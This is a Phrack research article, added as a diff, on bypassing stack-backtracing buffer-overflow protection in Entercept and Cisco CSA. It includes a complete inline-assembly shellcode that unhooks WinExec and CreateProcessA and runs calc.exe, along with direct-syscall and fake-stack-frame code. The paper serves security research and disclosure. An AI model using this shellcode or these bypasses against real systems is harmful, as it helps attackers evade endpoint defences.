@@ -1,0 +1,1069 @@
+
+                           ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3e, Phile #0x05 of 0x10
+
+
+|=-----------------------------------------------------------------------=|
+|=-----=[ Bypassing 3rd Party Windows Buffer Overflow Protection ]=------=|
+|=-----------------------------------------------------------------------=|
+|=--------------=[ anonymous <p62_wbo_a@author.phrack.org ]=-------------=|
+|=--------------=[ Jamie Butler <james.butler@hbgary.com> ]=-------------=|
+|=--------------=[ anonymous <p62_wbo_b@author.phrack.org ]=-------------=|
+
+
+
+--[ Contents
+
+
+  1 - Introduction
+
+  2 - Stack Backtracing
+
+  3 - Evading Kernel Hooks
+
+    3.1 - Kernel Stack Backtracing
+
+    3.2 - Faking Stack Frames
+
+  4 - Evading Userland Hooks
+
+    4.1 - Implementation Problems - Incomplete API Hooking
+
+          4.1.1 - Not Hooking all API Versions
+          4.1.2 - Not Hooking Deeply Enough
+          4.1.3 - Not Hooking Thoroughly Enough
+
+    4.2 - Fun With Trampolines
+
+          4.2.1 Patch Table Jumping
+          4.2.2 Hook Hopping
+
+    4.3 - Repatching Win32 APIs
+
+    4.4 - Attacking Userland Components
+
+          4.4.1 IAT Patching
+          4.4.2 Data Section Patching
+
+    4.5 - Calling Syscalls Directly
+
+    4.6 - Faking Stack Frames
+
+  5 - Conclusions
+
+
+
+--[ 1 - Introduction
+
+Recently, a number of commercial security systems started to offer
+protection against buffer overflows. This paper analyzes the protection
+claims and describes several techniques to bypass the buffer overflow
+protection.
+
+Existing commercial systems implement a number of techniques to protect
+against buffer overflows. Currently, stack backtracing is the most popular
+one. It is also the easiest to implement and the easiest to bypass.
+
+Several commercial products such as Entercept (now NAI Entercept) and
+Okena (now Cisco Security Agent) implement this technique.
+
+
+--[ 2 - Stack Backtracing
+
+Most of the existing commercial security systems do not actually prevent
+buffer overflows but rather try to attempt to detect the execution of
+shellcode.
+
+The most common technology used to detect shellcode is code page
+permission checking which involves checking whether code is executing on
+a writable page of memory. This is necessary since architectures such as
+x86 do not support the non-executable memory bit.
+
+Some systems also perform additional checking to see whether code's page
+of memory belongs to a memory mapped file section and not to an anonymous
+memory section.
+
+        [-----------------------------------------------------------]
+
+                page = get_page_from_addr( code_addr );
+                if (page->permissions & WRITABLE)
+                        return BUFFER_OVERFLOW;
+
+                ret = page_originates_from_file( page );
+                if (ret != TRUE)
+                        return BUFFER_OVERFLOW;
+
+        [-----------------------------------------------------------]
+               Pseudo code for code page permission checking
+
+Buffer overflow protection technologies (BOPT) that rely on stack
+backtracing don't actually create non-executable heap and stack segments.
+Instead they hook the OS and check for shellcode execution during the
+hooked API calls.
+
+Most operating systems can be hooked in userland or in kernel.
+
+Next section deals with evading kernel hooks, while section 4 deals with
+bypassing userland hooks.
+
+
+--[ 3 - Evading Kernel Hooks
+
+When hooking the kernel, Host Intrusion Prevention Systems (HIPS) must
+be able to detect where a userland API call originated. Due to
+the heavy use of kernel32.dll and ntdll.dll libraries, an API call is
+usually several stack frames away from the actual syscall trap call.
+For this reason, some intrusion preventions systems rely on using stack
+backtracing to locate the original caller of a system call.
+
+
+----[ 3.1 - Kernel Stack Backtracing
+
+While stack backtracing can occur from either userland or kernel, it is
+far more important for the kernel components of a BOPT than its userland
+components. The existing commercial BOPT's kernel components rely entirely
+on stack backtracing to detect shellcode execution. Therefore, evading a
+kernel hook is simply a matter of defeating the stack backtracing
+mechanism.
+
+Stack backtracing involves traversing stack frames and verifying that the
+return addresses pass the buffer overflow detection tests described above.
+Frequently, there is also an additional "return into libc" check, which
+involves checking that a return address points to an instruction
+immediately following a call or a jump. The basic operation of stack
+backtracing code, as used by a BOPT, is presented below.
+
+        [-----------------------------------------------------------]
+
+                while (is_valid_frame_pointer( ebp )) {
+                        ret_addr = get_ret_addr( ebp );
+
+                        if (check_code_page(ret_addr) == BUFFER_OVERFLOW)
+                                return BUFFER_OVERFLOW;
+
+                        if (does_not_follow_call_or_jmp_opcode(ret_addr))
+                                return BUFFER_OVERFLOW;
+
+                        ebp = get_next_frame( ebp );
+                }
+
+        [-----------------------------------------------------------]
+                    Pseudo code for BOPT stack backtracing
+
+When discussing how to evade stack backtracing, it is important to
+understand how stack backtracing works on an x86 architecture. A typical
+stack frame looks as follows during a function call:
+
+	:                         :
+        |-------------------------|
+        | function B parameter #2 |
+        |-------------------------|
+        | function B parameter #1 |
+        |-------------------------|
+        |    return EIP address   |
+        |-------------------------|
+        |        saved EBP        |
+        |=========================|
+        | function A parameter #2 |
+        |-------------------------|
+        | function A parameter #1 |
+        |-------------------------|
+        |    return EIP address   |
+        |-------------------------|
+        |        saved EBP        |
+        |-------------------------|
+	:                         :
+
+The EBP register points to the next stack frame. Without the EBP register
+it is very hard, if not impossible, to correctly identify and trace
+through all the stack frames.
+
+Modern compilers often omit the use of EBP as a frame pointer and use it
+as a general purpose register instead. With an EBP optimization, a stack
+frame looks as follows during a function call:
+
+        |-----------------------|
+        | function parameter #2 |
+        |-----------------------|
+        | function parameter #1 |
+        |-----------------------|
+        |   return EIP address  |
+        |-----------------------|
+
+Notice that the EBP register is not present on the stack. Without an EBP
+register it is not possible for the buffer overflow detection technologies
+to accurately perform stack backtracing. This makes their task incredibly
+hard as a simple return into libc style attack will bypass the protection.
+Simply originating an API call one layer higher than the BOPT hook defeats
+the detection technique.
+
+
+----[ 3.2 - Faking Stack Frames
+
+Since the stack is under complete control of the shellcode, it is possible
+to completely alter its contents prior to an API call. Specially crafted
+stack frames can be used to bypass the buffer overflow detectors.
+
+As was explained previously, the buffer overflow detector is looking for
+three key indicators of legitimate code: read-only page permissions,
+memory mapped file section and a return address pointing to an instruction
+immediately following a call or jmp. Since function pointers change
+calling semantics, BOPT do not (and cannot) check that a call or jmp
+actually points to the API being called. Most importantly, the BOPT cannot
+check return addresses beyond the last valid EBP frame pointer
+(it cannot stack backtrace any further).
+
+Evading a BOPT is therefore simply a matter of creating a "final" stack
+frame which has a valid return address. This valid return address must
+point to an instruction residing in a read-only memory mapped file section
+and immediately following a call or jmp. Provided that the dummy return
+address is reasonably close to a second return address, the shellcode can
+easily regain control.
+
+The ideal instruction sequence to point the dummy return address to is:
+
+        [-----------------------------------------------------------]
+
+                        jmp    [eax] ; or call [eax], or another register
+        dummy_return:   ...          ; some number of nops or easily
+                                     ; reversed instructions, e.g. inc eax
+                        ret          ; any return will do, e.g. ret 8
+
+        [-----------------------------------------------------------]
+
+
+Bypassing kernel BOPT components is easy because they must rely on user
+controlled data (the stack) to determine the validity of an API call. By
+correctly manipulating the stack, it is possible to prematurely terminate
+the stack return address analysis.
+
+This stack backtracing evasion technique is also effective against
+userland hooks (see section 4.6).
+
+
+--[ 4 - Evading Userland Hooks
+
+Given the presence of the correct instruction sequence in a valid region
+of memory, it is possible to trivially bypass kernel buffer overflow
+protection techniques. Similar techniques can be used to bypass userland
+BOPT components. In addition, since the shellcode executes with the same
+permissions as the userland hooks, a number of other techniques can be
+used to evade the detection.
+
+
+----[ 4.1 - Implementation Problems - Incomplete API Hooking
+
+There are many problems with the userland based buffer overflow protection
+technologies. For example, they require the buffer overflow protection
+code to be in the code path of all attacker's calls or the shellcode
+execution will go undetected.
+
+Trying to determine what an attacker will do with his or her shellcode
+a priori is an extremely hard problem, if not an impossible one. Getting
+on the right path is not easy. Some of the obstacles in the way include:
+
+     a. Not accounting for both UNICODE and ANSI versions of a Win32 API
+        call.
+
+     b. Not following the chaining nature of API calls. For example,
+        many functions in kernel32.dll are nothing more than wrappers for
+        other functions within kernel32.dll or ntdll.dll.
+
+     c. The constantly changing nature of the Microsoft Windows API.
+
+
+--------[ 4.1.1 - Not Hooking All API Versions
+
+A commonly encountered mistake with userland API hooking
+implementations is incomplete code path coverage. In order for an API
+interception based products to be effective, all APIs utilized by
+attackers must be hooked. This requires the buffer overflow protection
+technology to hook somewhere along the code path an attacker _has_ to
+take. However, as will be shown, once an attacker has begun executing
+code, it becomes very difficult for third party systems to cover all
+code paths. Indeed, no tested commercial buffer overflow detector actually
+provided an effective code path coverage. 
+
+Many Windows API functions have two versions: ANSI and UNICODE. The ANSI
+function names usually end in A, and UNICODE functions end in W because
+of their wide character nature. The ANSI functions are often nothing
+more than wrappers that call the UNICODE version of the API. For example,
+CreateFileA takes the ANSI file name that was passed as a parameter and
+turns it into an UNICODE string. It then calls CreateFileW. Unless a
+vendor hooks both the UNICODE and ANSI version of the API function, an
+attacker can bypass the protection mechanism by simply calling the other
+version of the function.
+
+For example, Entercept 4.1 hooks LoadLibraryA, but it makes no attempt
+to intercept LoadLibraryW. If a protection mechanism was only going to
+hook one version of a function, it would make more sense to hook the
+UNICODE version. For this particular function, Okena/CSA does a better
+job by hooking LoadLibraryA, LoadLibraryW, LoadLibraryExA, and
+LoadLibraryExW. Unfortunately for the third party buffer overflow
+detectors, simply hooking more functions in kernel32.dll is not enough. 
+
+
+--------[ 4.1.2 - Not Hooking Deeply Enough
+
+In Windows NT, kernel32.dll acts as a wrapper for ntdll.dll and yet many
+buffer overflow detection products do not hook functions within ntdll.dll.
+This simple error is similar to not hooking both the UNICODE and ANSI
+versions of a function. An attacker can simply call the ntdll.dll directly
+and completely bypass all the kernel32.dll "checkpoints" established by a
+buffer overflow detector.
+
+For example, NAI Entercept tries to detect shellcode calling
+GetProcAddress() in kernel32.dll. However, the shellcode can be rewritten
+to call LdrGetProcedureAddress() in ntdll.dll, which will accomplish the
+same goal, and at the same time never pass through the NAI Entercept hook.
+
+Similarly, shellcode can completely bypass userland hooks altogether and
+make system calls directly (see section 4.5).
+
+
+--------[ 4.1.3 - Not Hooking Thoroughly Enough
+
+The interactions between the various different Win32 API functions is
+byzantine, complex and difficult to understand. A vendor must make only
+one mistake in order to create a window of opportunity for an attacker.
+
+For example, Okena/CSA and NAI Entercept both hook WinExec trying to
+prevent attacker's shellcode from spawning a process.
+
+The call path for WinExec looks like this:
+
+       WinExec() --> CreateProcessA() --> CreateProcessInternalA() 
+
+Okena/CSA and NAI Entercept hook both WinExec() and CreateProcessA()
+(see Appendix A and B). However, neither product hooks
+CreateProcessInternalA() (exported by kernel32.dll). When writing a
+shellcode, an attacker could find the export for
+CreateProcessInternalA() and use it instead of calling WinExec().
+
+CreateProcessA() pushes two NULLs onto the stack before calling
+CreateProcessInternalA(). Thus a shellcode only needs to push two NULLs
+and then call CreateProcessInternalA() directly to evade the userland
+API hooks of both products.
+
+As new DLLs and APIs are released, the complexity of Win32 API internal
+interactions increases, making the problem worse. Third party product
+vendors are at a severe disadvantage when implementing their buffer
+overflow detection technologies and are bound to make mistakes which
+can be exploited by attackers.
+
+
+----[ 4.2 - Fun With Trampolines
+
+Most Win32 API functions begin with a five byte preamble. First, EBP is
+pushed onto the stack, then ESP is moved into EBP.
+
+        [-----------------------------------------------------------]
+
+             Code Bytes          Assembly
+                  55             push ebp
+                  8bec           mov ebp, esp
+
+        [-----------------------------------------------------------]
+
+Both Okena/CSA and Entercept use inline function hooking. They overwrite
+the first 5 bytes of a function with an immediate unconditional jump or
+call. For example, this is what the first few bytes of WinExec() look like
+after NAI Entercept's hooks have been installed:
+
+        [-----------------------------------------------------------]
+
+               Code Bytes          Assembly
+                     e8 xx xx xx xx       call xxxxxxxx
+                     54                   push esp
+                     53                   push ebx
+                     56                   push esi
+                     57                   push edi
+
+        [-----------------------------------------------------------]
+
+Alternatively, the first few bytes could be overwritten with a jump
+instruction:
+
+        [-----------------------------------------------------------]
+
+               Code Bytes               Assembly
+                       e9 xx xx xx xx     jmp xxxxxxxx
+                       ...
+
+        [-----------------------------------------------------------]
+ 
+Obviously, it is easy for shellcode to test for these and other signatures
+before calling a function. If a hijacking mechanism is detected, the
+shellcode can use several different techniques to bypass the hook. 
+
+
+------[ 4.2.1 - Patch Table Jumping
+
+When an API is hooked, the original preamble is saved into a table so that
+the buffer overflow detector can recreate the original API after
+performing its validation checks. The preamble is stored in a patch table,
+which resides somewhere in the address space of an application. When
+shellcode detects the presence of an API hook, it can simply search for
+the patch table and make its calls to patch table entries. This
+completely avoids the hook, preventing the userland buffer overflow
+detector components from ever being in the attacker's call path.
+
+
+------[ 4.2.2 - Hook Hopping
+
+Alternatively, instead of locating the patch table, shellcode can include
+its own copy of the original pre-hook preamble. After executing its own
+API preamble, the shellcode can transfer execution to immediately after
+the API hook (function address plus five bytes).
+
+Since Intel x86 has variable length instructions, one must take this into
+account in order to land on an even instruction boundary:
+ 
+        [-----------------------------------------------------------]
+
+                Shellcode:
+                        call WinExecPreamble
+ 
+                WinExecPreamble:
+                        push ebp
+                        mov ebp, esp
+                        sub esp, 54
+                        jmp WinExec+6
+
+        [-----------------------------------------------------------]
+
+This technique will not work if another function within the call path
+is also hooked. In this case, Entercept also hooks CreateProcessA(),
+which WinExec() calls. Thus, to evade detection shellcode should call
+CreateProcessA() using the stored copy of CreateProcessA's preamble.
+
+
+----[ 4.3 - Repatching Win32 APIs
+
+Thoroughly hooking Win32 APIs is not effective when certain fundamental
+errors are made in the implementation of a userland buffer overflow
+detection component.
+
+Certain implementations (NAI Entercept) have a serious problem with the
+way they perform their API hooking. In order to be able to overwrite
+preambles of hooked functions, the code section for a DLL has to be made
+writable. Entercept marks code sections of kernel32.dll and ntdll.dll as
+writable in order to be able to modify their contents. However, Entercept
+never resets the writable bit!
+
+Due to this serious security flaw, it is possible for an attacker to
+overwrite the API hook by re-injecting the original preamble code. For
+the WinExec() and CreateProcessA() examples, this would require
+overwriting the first 6 bytes (just to be instruction aligned) of
+WinExec() and CreateProcessA() with the original preamble.
+
+        [-----------------------------------------------------------]
+                WinExecOverWrite:
+                     Code Bytes          Assembly
+                       55                push ebp
+                       8bec              mov ebp, esp
+                       83ec54            sub esp, 54
+
+                CreateProcessAOverWrite:
+                     Code Bytes          Assembly
+                       55                push ebp
+                       8bec              mov ebp, esp
+                       ff752c            push DWORD PTR [ebp+2c]
+        [-----------------------------------------------------------]
+
+This technique will not work against properly implemented buffer overflow
+detectors, however it is very effective against NAI Entercept. A complete
+shellcode example which overwrites the NAI Entercept hooks is presented
+below:
+
+        [-----------------------------------------------------------]
+
+              // This sample code overwrites the preamble of WinExec and
+              // CreateProcessA to avoid detection. The code then
+              // calls WinExec with a "calc.exe" parameter.
+              // The code demonstrates that by overwriting function
+              // preambles, it is able to evade Entercept and Okena/CSA
+              // buffer overflow protection.
+
+                _asm {
+                        pusha
+
+                        jmp JUMPSTART
+        START:
+                        pop ebp
+                        xor eax, eax
+                        mov al, 0x30
+                        mov eax, fs:[eax];
+                        mov eax, [eax+0xc];
+
+                        // We now have the module_item for ntdll.dll
+                        mov eax, [eax+0x1c]
+
+                        // We now have the module_item for kernel32.dll
+                        mov eax, [eax]
+
+                        // Image base of kernel32.dll
+                        mov eax, [eax+0x8]
+
+                        movzx ebx, word ptr [eax+3ch]
+
+                        // pe.oheader.directorydata[EXPORT=0]
+                        mov esi, [eax+ebx+78h]
+                        lea esi, [eax+esi+18h]
+
+                        // EBX now has the base module address
+                        mov ebx, eax
+                        lodsd
+
+                        // ECX now has the number of function names
+                        mov ecx, eax
+                        lodsd                        
+                        add eax,ebx
+
+                        // EDX has addresses of functions               
+                        mov edx,eax
+
+                        lodsd
+
+                        // EAX has address of names              
+                        add   eax,ebx
+
+                        // Save off the number of named functions
+			// for later
+                        push ecx
+
+                        // Save off the address of the functions
+                        push edx
+
+        RESETEXPORTNAMETABLE:
+                        xor edx, edx
+
+        INITSTRINGTABLE:
+                        mov esi, ebp // Beginning of string table
+                        inc esi
+
+        MOVETHROUGHTABLE:
+                        mov edi, [eax+edx*4]
+                        add edi, ebx // EBX has the process base address
+
+                        xor ecx, ecx
+                        mov cl, BYTE PTR [ebp]
+                        test cl, cl
+                        jz DONESTRINGSEARCH
+		
+
+        STRINGSEARCH:   // ESI points to the function string table
+                        repe cmpsb
+                        je Found
+
+                        // The number of named functions is on the stack
+                        cmp [esp+4], edx
+                        je NOTFOUND
+                        inc edx
+                        jmp INITSTRINGTABLE
+        Found:
+                        pop ecx
+                        shl edx, 2
+                        add edx, ecx
+                        mov edi, [edx]
+                        add edi, ebx
+                        push edi
+                        push ecx
+                        xor ecx, ecx
+                        mov cl, BYTE PTR [ebp]
+                        inc ecx
+                        add ebp, ecx
+                        jmp RESETEXPORTNAMETABLE
+
+        DONESTRINGSEARCH:
+        OverWriteCreateProcessA:
+                        pop edi
+                        pop edi
+                        push 0x06
+                        pop ecx
+                        inc esi
+                        rep movsb
+
+        OverWriteWinExec:
+                        pop edi
+                        push edi
+                        push 0x06
+                        pop ecx
+                        inc esi
+                        rep movsb
+
+        CallWinExec:
+                        push 0x03
+                        push esi
+                        call [esp+8]
+
+        NOTFOUND:
+                        pop edx
+        STRINGEXIT:
+                        pop ecx
+                        popa;
+                        jmp EXIT
+
+        JUMPSTART:
+                        add esp, 0x1000
+                        call START
+        WINEXEC:
+                        _emit 0x07
+                        _emit 'W'
+                        _emit 'i'
+                        _emit 'n'
+                        _emit 'E'
+                        _emit 'x'
+                        _emit 'e'
+                        _emit 'c'
+        CREATEPROCESSA:
+                        _emit 0x0e
+                        _emit 'C'
+                        _emit 'r'
+                        _emit 'e'
+                        _emit 'a'
+                        _emit 't'
+                        _emit 'e'
+                        _emit 'P'
+                        _emit 'r'
+                        _emit 'o'
+                        _emit 'c'
+                        _emit 'e'
+                        _emit 's'
+                        _emit 's'
+                        _emit 'A'
+        ENDOFTABLE:
+                        _emit 0x00
+
+        WinExecOverWrite:
+                        _emit 0x06
+                        _emit 0x55
+                        _emit 0x8b
+                        _emit 0xec
+                        _emit 0x83
+                        _emit 0xec
+                        _emit 0x54
+        CreateProcessAOverWrite:
+                        _emit 0x06
+                        _emit 0x55
+                        _emit 0x8b
+                        _emit 0xec
+                        _emit 0xff
+                        _emit 0x75
+                        _emit 0x2c
+        COMMAND:
+                        _emit 'c'
+                        _emit 'a'
+                        _emit 'l'
+                        _emit 'c'
+                        _emit '.'
+                        _emit 'e'
+                        _emit 'x'
+                        _emit 'e'
+                        _emit 0x00
+
+        EXIT:
+                        _emit 0x90
+
+                        // Normally call ExitThread or something here
+                        _emit 0x90
+                }
+
+        [-----------------------------------------------------------]
+
+
+----[ 4.4 - Attacking Userland Components
+
+While evading the hooks and techniques used by userland buffer overflow
+detector components is effective, there exist other mechanisms of
+bypassing the detection. Because both the shellcode and the buffer
+overflow detector are executing with the same privileges and in the same
+address space, it is possible for shellcode to directly attack the
+buffer overflow detector userland component.
+
+Essentially, when attacking the buffer overflow detector userland
+component the attacker is attempting to subvert the mechanism used to
+perform the shellcode detection check. There are only two principle
+techniques for shellcode validation checking. Either the data used for the
+check is determined dynamically during each hooked API call, or the data
+is gathered at process start up and then checked during each call.
+In either case, it is possible for an attacker to subvert the process.
+
+
+------[ 4.4.1 - IAT Patching
+
+Rather than implementing their own versions of memory page information
+functions, the commercial buffer overflow protection products simply use
+the operating system APIs. In Windows NT, these are implemented in
+ntdll.dll. These APIs will be imported into the userland component
+(itself a DLL) via its PE Import Table. An attacker can patch vectors
+within the import table to alter the location of an API to a function
+supplied by the shellcode. By supplying the function used to do the
+validation checking by the buffer overflow detector, it is trivial for
+an attacker to evade detection.
+
+
+------[ 4.4.2 - Data Section Patching
+
+For various reasons, a buffer overflow detector might use a pre-built
+list of page permissions within the address space. When this is the
+case, altering the address of the VirtualQuery() API is not effective.
+To subvert the buffer overflow detector, the shellcode has to locate and
+modify the data table used by the return address validation routines.
+This is a fairly straightforward, although application specific, technique
+for subverting buffer overflow prevention technologies.
+
+
+----[ 4.5 - Calling Syscalls Directly
+
+As mentioned above, rather than using ntdll.dll APIs to make system
+calls, it is possible for an attacker to create shellcode which makes
+system call directly. While this technique is very effective against
+userland components, it obviously cannot be used to bypass kernel based
+buffer overflow detectors. 
+
+To take advantage of this technique you must understand what parameters a
+kernel function uses. These may not always be the same as the parameters
+required by the kernel32 or ntdll API versions.
+
+Also, you must know the system call number of the function in question.
+You can find this dynamically using a technique similar to the one to find
+function addresses. Once you have the address of the ntdll.dll version of
+the function you want to call, index into the function one byte and read
+the following DWORD. This is the system call number in the system call
+table for the function. This is a common trick used by rootkit developers.
+
+Here is the pseudo code for calling NtReadFile system call directly:
+	
+	...
+	xor eax, eax
+	
+	// Optional Key
+	push eax        
+	// Optional pointer to large integer with the file offset
+	push eax	    	
+
+	push Length_of_Buffer
+	push Address_of_Buffer
+
+	// Before call make room for two DWORDs called the IoStatusBlock
+	push Address_of_IoStatusBlock 
+
+	// Optional ApcContext
+	push eax
+	// Optional ApcRoutine
+	push eax
+	// Optional Event
+	push eax
+
+	// Required file handle
+	push hFile
+
+	// EAX must contain the system call number
+	mov eax, Found_Sys_Call_Num
+
+	// EDX needs the address of the userland stack
+	lea edx, [esp]
+
+	// Trap into the kernel
+	// (recent Windows NT versions use "sysenter" instead)
+	int 2e
+
+
+----[ 4.6 - Faking Stack Frames
+
+As described in section 3.2, kernel based stack backtracing can be
+bypassed using fake frames. Same techniques works against userland based
+detectors.
+
+To bypass both userland and kernel backtracing, shellcode can create a
+fake stack frame without the ebp register on stack. Since stack
+backtracing relies on the presence of the ebp register to find the next
+stack frame, fake frames can stop backtracing code from tracing past
+the fake frame.
+
+Of course, generating a fake stack frame is not going to work when the
+EIP register still points to shellcode which resides in a writable
+memory segment. To bypass the protection code, shellcode needs to use
+an address that lies in a non-writable memory segment. This presents
+a problem since shellcode needs a way to eventually regain control of
+the execution.
+
+The trick to regaining control is to proxy the return to shellcode
+through a "ret" instruction which resides in a non-writable memory
+segment. "ret" instruction can be found dynamically by searching memory
+for a 0xC3 opcode.
+
+Here is an illustration of a normal LoadLibrary("kernel32.dll") call
+that originates from a writable memory segment:
+
+
+	push	kernel32_string
+	call	LoadLibrary
+
+	return_eip:
+
+
+	.
+	.
+	.
+
+	LoadLibrary:	; * see below for a stack illustration
+
+	.
+	.
+	.
+	ret		; return to stack-based return_eip
+
+
+
+	|------------------------------|
+	| address of "kernel32.dll" str|
+	|------------------------------|
+	| return address (return_eip)  |
+	|------------------------------|
+
+
+As explained before, the buffer overflow protection code executes before
+LoadLibrary gets to run. Since the return address (return_eip) is in a
+writable memory segment, the protection code logs the overflow
+and terminates the process.
+
+Next example illustrates 'proxy through a "ret" instruction' technique:
+
+
+	push	return_eip
+	push	kernel32_string
+
+	; fake "call LoadLibrary" call
+	push	address_of_ret_instruction
+	jmp	LoadLibrary
+
+	return_eip:
+
+
+	.
+	.
+	.
+
+	LoadLibrary:	; * see below for a stack illustration
+
+	.
+	.
+	.
+	ret		; return to non stack-based address_of_ret_instruction
+
+
+
+
+	address_of_ret_instruction:
+
+	.
+	.
+	.
+	ret		; return to stack-based return_eip
+
+
+
+Once again, the buffer overflow protection code executes before
+LoadLibrary gets to run. This time though, the stack is setup with a
+return address pointing to a non-writable memory segment. In addition,
+the ebp register is not present on stack thus the protection code cannot
+perform stack backtracing and determine that the return address in the
+next stack frame points to a writable segment. This allows the shellcode
+to call LoadLibrary which returns to the "ret" instruction. In its turn,
+the "ret" instruction pops the next return address off stack
+(return_eip) and transfers control to it.
+
+
+	|------------------------------|
+	| return address (return_eip)  |
+	|------------------------------|
+	| address of "kernel32.dll" str|
+	|------------------------------|
+	| address of "ret" instruction |
+	|------------------------------|
+
+
+In addition, any number of arbitrary complex fake stack frames can be
+setup to further confuse the protection code.
+
+Here is an example of a fake frame that uses a "ret 8" instruction
+instead of simple "ret":
+
+
+	|--------------------------------|
+	|          return address        |
+	|--------------------------------|
+	|  address of "ret" instruction  |	<- fake frame 2
+	|--------------------------------|
+	|         any value		 |
+	|--------------------------------|
+	| address of "kernel32.dll" str  |
+	|--------------------------------|
+	| address of "ret 8" instruction |	<- fake frame 1
+	|--------------------------------|
+
+
+This causes an extra 32-bit value to be removed from stack, complicating
+any kind of analysis even further.
+
+
+--[ 5 - Conclusions
+
+The majority of commercial security systems do not actually prevent
+buffer overflows but rather detect the execution of shellcode. The most
+common technology used to detect shellcode is code page permission
+checking which relies on stack backtracing.
+
+Stack backtracing involves traversing stack frames and verifying that
+the return addresses do not originate from writable memory segments such
+as stack or heap areas.
+
+The paper presents a number of different ways to bypass both userland
+and kernel based stack backtracing. These range from tampering with
+function preambles to creating fake stack frames.
+
+In conclusion, the majority of current buffer overflow protection
+implementations are flawed, providing a false sense of security and
+little real protection against determined attackers. 
+
+
+
+
+Appendix A: Entercept 4.1 Hooks
+
+
+Entercept hooks a number of functions in userland and in the kernel. Here
+is a list of the currently hooked functions as of Entercept 4.1.
+
+User Land
+     msvcrt.dll
+          _creat
+          _read
+          _write
+          system
+     kernel32.dll
+          CreatePipe
+          CreateProcessA
+          GetProcAddress
+          GetStartupInfoA
+          LoadLibraryA
+          PeekNamedPipe
+          ReadFile
+          VirtualProtect
+          VirtualProtectEx
+          WinExec
+          WriteFile
+     advapi32.dll
+          RegOpenKeyA
+     rpcrt4.dll
+          NdrServerInitializeMarshall
+     user32.dll
+          ExitWindowsEx
+     ws2_32.dll
+          WPUCompleteOverlappedRequest
+          WSAAddressToStringA
+          WSACancelAsyncRequest
+          WSACloseEvent
+          WSAConnect
+          WSACreateEvent
+          WSADuplicateSocketA
+          WSAEnumNetworkEvents
+          WSAEventSelect
+          WSAGetServiceClassInfoA
+          WSCInstallNameSpace
+     wininet.dll
+          InternetSecurityProtocolToStringW
+          InternetSetCookieA
+          InternetSetOptionExA
+     lsasrv.dll
+          LsarLookupNames
+          LsarLookupSids2
+     msv1_0.dll
+          Msv1_0ExportSubAuthenticationRoutine
+          Msv1_0SubAuthenticationPresent
+
+Kernel
+     NtConnectPort
+     NtCreateProcess
+     NtCreateThread
+     NtCreateToken
+     NtCreateKey
+     NtDeleteKey
+     NtDeleteValueKey
+     NtEnumerateKey
+     NtEnumerateValueKey
+     NtLoadKey
+     NtLoadKey2
+     NtQueryKey
+     NtQueryMultipleValueKey
+     NtQueryValueKey
+     NtReplaceKey
+     NtRestoreKey
+     NtSetValueKey
+     NtMakeTemporaryObject
+     NtSetContextThread
+     NtSetInformationProcess
+     NtSetSecurityObject
+     NtTerminateProcess
+
+
+
+Appendix B: Okena/Cisco CSA 3.2 Hooks
+
+
+Okena/CSA hooks many functions in userland but many less in the kernel.
+A lot of the userland hooks are the same ones that Entercept hooks.
+However, almost all of the functions Okena/CSA hooks in the kernel are
+related to altering keys in the Windows registry. Okena/CSA does not
+seem as concerned as Entercept about backtracing calls in the kernel.
+This leads to an interesting vulnerability, left as an exercise to the
+reader.
+
+User Land
+     kernel32.dll
+          CreateProcessA
+          CreateProcessW
+          CreateRemoteThread
+          CreateThread
+          FreeLibrary
+          LoadLibraryA
+          LoadLibraryExA
+          LoadLibraryExW
+          LoadLibraryW
+          LoadModule
+          OpenProcess
+          VirtualProtect
+          VirtualProtectEx
+          WinExec
+          WriteProcessMemory
+    ole32.dll
+          CoFileTimeToDosDateTime
+          CoGetMalloc
+          CoGetStandardMarshal
+          CoGetState
+          CoResumeClassObjects
+          CreateObjrefMoniker
+          CreateStreamOnHGlobal
+          DllGetClassObject
+          StgSetTimes
+          StringFromCLSID
+     oleaut32.dll
+          LPSAFEARRAY_UserUnmarshal
+     urlmon.dll
+          CoInstall
+
+Kernel  
+     NtCreateKey
+     NtOpenKey
+     NtDeleteKey
+     NtDeleteValueKey
+     NtSetValueKey
+     NtOpenProcess
+     NtWriteVirtualMemory     
+
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
